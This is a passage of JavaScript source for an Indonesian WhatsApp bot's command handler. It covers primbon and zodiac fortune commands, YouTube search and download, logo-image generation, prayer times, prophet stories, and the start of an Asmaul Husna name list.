• *Tanggal Lahir :* ${anu.message.tgl_lahir}
• *Hari Naas :* ${anu.message.hari_naas}
• *Info :* ${anu.message.catatan}
• *Catatan :* ${anu.message.info}`
reply(teks)
}
break
case 'harinaga': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *Tanggal Lahir :* ${anu.message.tgl_lahir}
• *Arah Naga Hari :* ${anu.message.arah_naga_hari}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'arahrejeki': 
case 'arahrezeki': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *tanggal Lahir :* ${anu.message.tgl_lahir}
• *Arah Rezeki :* ${anu.message.arah_rejeki}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'peruntungan': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = q.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}
• *Hasil :* ${anu.message.result}
• *Catatan :* ${anu.message.catatan}`
}
break
case 'weton': 
case 'wetonjawa': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Tanggal :* ${anu.message.tanggal}
• *Jumlah Neptu :* ${anu.message.jumlah_neptu}
• *Watak Hari :* ${anu.message.watak_hari}
• *Naga Hari :* ${anu.message.naga_hari}
• *Jam Baik :* ${anu.message.jam_baik}
• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`
reply(teks)
}
break
case 'karakter': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Garis Hidup :* ${anu.message.garis_hidup}`
reply(teks)
}
break
case 'keberuntungan': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Hasil :* ${anu.message.result}`
reply(teks)
}
break
case 'masasubur': {
if (!q) return reply( `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = q.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
let teks = `
•  *Hasil :* ${anu.message.result}
•  *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
  case 'zodiak': 
case 'zodiac': {
if (!q) return reply( `Example : ${prefix + command} 7 7 2005`)
let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(q)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
let teks = `
∘ *Zodiak :* ${anu.message.zodiak}
∘ *Nomor :* ${anu.message.nomor_keberuntungan}
∘ *Aroma :* ${anu.message.aroma_keberuntungan}
∘ *Planet :* ${anu.message.planet_yang_mengitari}
∘ *Bunga :* ${anu.message.bunga_keberuntungan}
∘ *Warna :* ${anu.message.warna_keberuntungan} 
∘ *Batu :* ${anu.message.batu_keberuntungan}
∘ *Elemen :* ${anu.message.elemen_keberuntungan}
∘ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}
∘ *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break

 // ===================================== // 


case 'ytmp3': case 'youtubemp3': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=QfPtFMhjsi6Tccajwi7ow`
return downloadyt(text, "mp3") 
}
break
case 'ytmp4': case 'youtubemp4': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
return downloadyt(text, "mp4") 
}
break
case "youtubsearch": case "yts": 
if (!text) throw `Example : ${prefix + command} story wa anime`
let search = await yts(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `•° No : ${no++}\n•° Type : ${i.type}\n•° Video ID : ${i.videoId}\n•° Title : ${i.title}\n•° Views : ${i.views}\n•° Duration : ${i.timestamp}\n•° Upload At : ${i.ago}\n•° Url : ${i.url}\n\n─────────────────\n\n`
}
ptz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
break
 case "ytplay": case "play": {
if (!text) return m.reply("Apa yg kamu cari");
	try {   	

 let search = await yts(text);
let url = search.all[0].type === "channel" ? search.all[1].url : search.all[0].url;
const ytdll = new Ytdl();
const result = await ytdll.play(url);
const title = result.title;
let videoId = url.split("v=")[1];
let thumbUrl = `https://i.ytimg.com/vi/${videoId}/default.jpg`;
let thumbBuffer = await getBuffer(thumbUrl);

ptz.sendMessage(m.chat, { 
    audio: { 
        url: result.audio['128'].url,
        mimetype: 'audio/mpeg',
        ptt: true 
    },
    fileName: `${title}.mp3`,
    contextInfo: {
        externalAdReply: {
            title: title,
            body: hariini,
            thumbnail: thumbBuffer,
            sourceUrl: result.audio['128'].url,
            mediaType: 2,
            mediaUrl: url,
        }
    }
}, { quoted: m });
    
	} catch (e) {
		m.reply(e);
	}
	}
    break
         case 'kodebahasa':{
	let LANGUAGES = `
	*╭─❲ KODE BAHASA ❳*
	*│*
	*│▸* af: Afrikaans 
	*│▸* sq: Albanian
	*│▸* ar: Arabic
	*│▸* hy: Armenian
	*│▸* ca: Catalan 
	*│▸* zh: Chinese 
	*│▸* zh-cn: Chinese (Mandarin/China)
	*│▸* zh-tw: Chinese (Mandarin/Taiwan)
	*│▸* zh-yue: Chinese (Cantonese)
	*│▸* hr: Croatian
	*│▸* cs: Czech
	*│▸* da: Danish
	*│▸* nl: Dutch
	*│▸* en: English    
	*│▸* en-au: English (Australia)
	*│▸* en-uk: English (United Kingdom)
	*│▸* en-us: English (United States) 
	*│▸* eo: Esperanto 
	*│▸* fi: Finnish 
	*│▸* fr: French
	*│▸* de: German
	*│▸* el: Greek 
	*│▸* ht: Haitian Creole 
	*│▸* hi: Hindi 
	*│▸* hu: Hungarian 
	*│▸* is: Icelandic 
	*│▸* id: Indonesian 
	*│▸* it: Italian
	*│▸* ja: Japanese
	*│▸* ko: Korean
	*│▸* la: Latin
	*│▸* lv: Latvian
	*│▸* mk: Macedonian
	*│▸* no: Norwegian
	*│▸* pl: Polish
	*│▸* pt: Portuguese
	*│▸* pt-br: Portuguese (Brazil)
	*│▸* ro: Romanian
	*│▸* ru: Russian
	*│▸* sr: Serbian
	*│▸* sk: Slovak
	*│▸* es: Spanish 
	*│▸* es-es: Spanish (Spain)
	*│▸* es-us: Spanish (United States)
	*│▸* sw: Swahili
	*│▸* sv: Swedish
	*│▸* ta: Tamil
	*│▸* th: Thai
	*│▸* tr: Turkish
	*│▸* vi: Vietnamese 
	*│▸* cy: Welsh
	*│*
	*╰────────────•*`
	reply(LANGUAGES)
	}
	break
        
     //========// game



//==============//


case 'flaming1':{
if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&script=fluffy-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `Veemon Md`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
 case 'flaming2':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `Veemon Md`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
case 'flaming3':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `Veemon Md`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
case 'flaming4':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `Veemon Md`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
case 'flaming5':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `Veemon Md`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
case 'flaming6':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=0&backgroundColor=%23101820&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `Veemon Md`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break        

        

//=================================// SILAMI, ku segel biar bagus 
        case "jadwalsholat": case "sholat":
try {
if (text === "") {
let data = await (await fetch("https://api.aladhan.com/v1/timingsByCity?city=Makassar&country=Indonesia&method=8")).json();
   let jadwalSholatMakasar = data.data.timings


Subuh = data.data.timings.Fajr

Dhuhr = data.data.timings.Dhuhr
 
Magrib =  data.data.timings.Maghrib

Isha = data.data.timings.Isha

Asar = data.data.timings.Asr

reply (`
*${m2}[ - J A D W A L - ]${m2}*

• *Dhuhr:* ${Dhuhr} 
• *Asr*: ${Asar}
-
• *Maghrib:* ${Magrib}
-
• *Isha:* ${Isha}
• *Subuh:* ${Subuh}

#makassar

*Note:* 

_Kamu bisa Lihat Timings Di kota Lain, Contoh: .jadwalsholat Yogyakarta_
`)
} else if (text === `${text}`) {
let data = await (await fetch(`https://api.aladhan.com/v1/timingsByCity?city=${text}&country=Indonesia&method=8`)).json();
   let jadwalSholatMakasar = data.data.timings


Subuh = data.data.timings.Fajr

Dhuhr = data.data.timings.Dhuhr
 
Magrib =  data.data.timings.Maghrib
Asar = data.data.timings.Asr
Isha = data.data.timings.Isha
reply (`
*${m2}[ - J A D W A L - ]${m2}*

• *Dhuhr:* ${Dhuhr} 
• *Asr*: ${Asar}
-
• *Maghrib:* ${Magrib}
-
• *Isha:* ${Isha}
• *Subuh:* ${Subuh}

#${text}

*Note:* 

_Kamu bisa Lihat Timings Di kota Lain, Contoh: .jadwalsholat Yogyakarta_
`)
}
} catch(err) {
m.reply("Web Error Coba lagi Dengan Kota Yg Berbeda.")
}
break

case 'kisahnabi': {
if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return m.reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*— — — — — — ${m2}[ K I S A H ]${m2} — — — — — —*

${kisah.description}`

m.reply(`${hasil}`)

}
break

case 'asmaulhusna': {
const contoh = `*Asmaul Husna*`
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
const asmaulhusna = [
{
index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
index: 18,
latin: "Al Fattaah",
arabic: "الْفَتَّاحُ",
translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
translation_en: "The Opener, the Victory Giver"
},
{
index: 19,
latin: "Al ‘Aliim",
arabic: "اَلْعَلِيْمُ",
translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
translation_en: "The All Knowing, the Omniscient"
},
{
index: 20,
latin: "Al Qaabidh",
arabic: "الْقَابِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
translation_en: "The Restrainer, the Straightener"
},
{
index: 21,
latin: "Al Baasith",
arabic: "الْبَاسِطُ",
translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
translation_en: "The Expander, the Munificent"
},
{
index: 22,
latin: "Al Khaafidh",
arabic: "الْخَافِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
translation_en: "The Abaser"
},
{
index: 23,
latin: "Ar Raafi’",
arabic: "الرَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
translation_en: "The Exalter"
},
{
index: 24,
latin: "Al Mu’izz",
arabic: "الْمُعِزُّ",
translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
translation_en: "The Giver of Honor"
},
{
index: 25,
latin: "Al Mudzil",
arabic: "المُذِلُّ",
translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
translation_en: "The Giver of Dishonor"
},
{
index: 26,
latin: "Al Samii’",
arabic: "السَّمِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
translation_en: "The All Hearing"
},
{
index: 27,
latin: "Al Bashiir",
arabic: "الْبَصِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
translation_en: "The All Seeing"
},
{
index: 28,
latin: "Al Hakam",
arabic: "الْحَكَمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
translation_en: "The Judge, the Arbitrator"
},
{
index: 29,
latin: "Al ‘Adl",
arabic: "الْعَدْلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Utterly Just"
},
{
index: 30,
latin: "Al Lathiif",
arabic: "اللَّطِيفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
translation_en: "The Subtly Kind"
},
{
index: 31,
latin: "Al Khabiir",
arabic: "الْخَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
translation_en: "The All Aware"
},
{
index: 32,
latin: "Al Haliim",
arabic: "الْحَلِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
translation_en: "The Forbearing, the Indulgent"
},
{
index: 33,
latin: "Al ‘Azhiim",
arabic: "الْعَظِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
translation_en: "The Magnificent, the Infinite"
},
{
index: 34,
latin: "Al Ghafuur",
arabic: "الْغَفُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
translation_en: "The All Forgiving"
},
{
index: 35,
latin: "As Syakuur",
arabic: "الشَّكُورُ",
translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
translation_en: "The Grateful"
},
{
index: 36,
latin: "Al ‘Aliy",
arabic: "الْعَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Sublimely Exalted"
},
{
index: 37,
latin: "Al Kabiir",
arabic: "الْكَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
translation_en: "The Great"
},
{
index: 38,
latin: "Al Hafizh",
arabic: "الْحَفِيظُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
translation_en: "The Preserver"
},
{
index: 39,
latin: "Al Muqiit",
arabic: "المُقيِت",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
translation_en: "The Nourisher"
},
{
index: 40,
latin: "Al Hasiib",
arabic: "الْحسِيبُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
translation_en: "The Reckoner"
},
{
index: 41,
latin: "Al Jaliil",
arabic: "الْجَلِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Majestic"
},
{
index: 42,
latin: "Al Kariim",
arabic: "الْكَرِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
translation_en: "The Bountiful, the Generous"
},
{
index: 43,
latin: "Ar Raqiib",
arabic: "الرَّقِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
translation_en: "The Watchful"
},
{
index: 44,
latin: "Al Mujiib",
arabic: "الْمُجِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
translation_en: "The Responsive, the Answerer"
},
{
index: 45,
latin: "Al Waasi’",
arabic: "الْوَاسِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
translation_en: "The Vast, the All Encompassing"
},
{
index: 46,
latin: "Al Hakiim",
arabic: "الْحَكِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
translation_en: "The Wise"
},
{
index: 47,
latin: "Al Waduud",
arabic: "الْوَدُودُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
translation_en: "The Loving, the Kind One"
},
{
index: 48,
latin: "Al Majiid",
arabic: "الْمَجِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The All Glorious"
},
{
index: 49,
latin: "Al Baa’its",
arabic: "الْبَاعِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
translation_en: "The Raiser of the Dead"
},
{
index: 50,
latin: "As Syahiid",
arabic: "الشَّهِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
translation_en: "The Witness"
},
{
index: 51,
latin: "Al Haqq",
arabic: "الْحَقُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
translation_en: "The Truth, the Real"
},
{
index: 52,
latin: "Al Wakiil",
arabic: "الْوَكِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
translation_en: "The Trustee, the Dependable"
},
{
index: 53,
latin: "Al Qawiyyu",
arabic: "الْقَوِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
translation_en: "The Strong"
},
{
index: 54,
latin: "Al Matiin",
arabic: "الْمَتِينُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
translation_en: "The Firm, the Steadfast"
},
{
index: 55,
latin: "Al Waliyy",
arabic: "الْوَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
translation_en: "The Protecting Friend, Patron, and Helper"
},
{
index: 56,
latin: "Al Hamiid",
arabic: "الْحَمِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
translation_en: "The All Praiseworthy"
},
{
index: 57,
latin: "Al Mushii",
arabic: "الْمُحْصِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
translation_en: "The Accounter, the Numberer of All"
},
{
index: 58,
latin: "Al Mubdi’",
arabic: "الْمُبْدِئُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
translation_en: "The Producer, Originator, and Initiator of all"
},
{
index: 59,
latin: "Al Mu’iid",
arabic: "الْمُعِيدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
translation_en: "The Reinstater Who Brings Back All"
},
{
index: 60,
latin: "Al Muhyii",
arabic: "الْمُحْيِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
translation_en: "The Giver of Life"
},
{
index: 61,
latin: "Al Mumiitu",
arabic: "اَلْمُمِيتُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
translation_en: "The Bringer of Death, the Destroyer"
},
{
index: 62,
latin: "Al Hayyu",
arabic: "الْحَيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
translation_en: "The Ever Living"
},
{
index: 63,
latin: "Al Qayyuum",
arabic: "الْقَيُّومُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
translation_en: "The Self Subsisting Sustainer of All"
},
{
index: 64,
latin: "Al Waajid",
arabic: "الْوَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
translation_en: "The Perceiver, the Finder, the Unfailing"
},
{
index: 65,
latin: "Al Maajid",
arabic: "الْمَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Illustrious, the Magnificent"
},
{
index: 66,
latin: "Al Wahiid",
arabic: "الْواحِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
translation_en: "The One, The Unique, Manifestation of Unity"
},
{
index: 67,
latin: "Al ‘Ahad",
arabic: "اَلاَحَدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
translation_en: "The One, the All Inclusive, the Indivisible"
},
{
index: 68,
latin: "As Shamad",
arabic: "الصَّمَدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
},
{
index: 69,
latin: "Al Qaadir",
arabic: "الْقَادِرُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
translation_en: "The All Able"
},
{
index: 70,
latin: "Al Muqtadir",
arabic: "الْمُقْتَدِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
translation_en: "The All Determiner, the Dominant"
},
{
index: 71,
latin: "Al Muqaddim",
arabic: "الْمُقَدِّمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
translation_en: "The Expediter, He who brings forward"
},
{
index: 72,
latin: "Al Mu’akkhir",
arabic: "الْمُؤَخِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
translation_en: "The Delayer, He who puts far away"
},
{
index: 73,
latin: "Al Awwal",
arabic: "الأوَّلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
translation_en: "The First"
},
{
index: 74,
latin: "Al Aakhir",
arabic: "الآخِرُ",
